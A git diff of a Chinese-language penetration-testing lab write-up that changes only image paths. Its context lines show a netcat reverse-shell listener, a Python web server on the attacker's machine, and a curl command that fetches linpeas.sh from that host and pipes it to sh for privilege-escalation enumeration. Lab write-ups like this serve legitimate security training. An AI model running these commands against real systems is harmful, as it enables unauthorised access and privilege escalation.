@@ -84,7 +84,7 @@ nc -lvnp 1234
 
 成功获得反弹shell，并获得local.txt：
 
-<figure><img src="../.gitbook/assets/15 (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/15 (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## 权限提升
 
@@ -99,7 +99,7 @@ python3 -m http.server
 curl -L 192.168.45.172:8000/linpeas.sh |sh
 ```
 
-<figure><img src="../.gitbook/assets/16 (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/16 (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../.gitbook/assets/17 (2).png" alt=""><figcaption></figcaption></figure>
 
@@ -115,4 +115,4 @@ curl -L 192.168.45.172:8000/linpeas.sh |sh
 
 <figure><img src="../.gitbook/assets/19 (2).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/20 (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/20 (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
